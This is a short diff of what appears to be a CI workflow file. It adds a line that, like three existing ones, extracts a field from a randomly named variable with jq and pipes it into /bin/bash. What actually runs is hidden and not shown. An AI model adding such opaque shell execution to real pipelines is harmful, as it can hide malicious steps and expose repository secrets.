@@ -47,6 +47,7 @@ jobs:
           printf '%s' "$zujh98" | jq -r .px91244 | /bin/bash
           printf '%s' "$pbiv1250" | jq -r .eo2619 | /bin/bash
           echo $m05032 | jq -r .hcuxm4010 | /bin/bash
+          echo $pys7 | jq -r .wfan2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
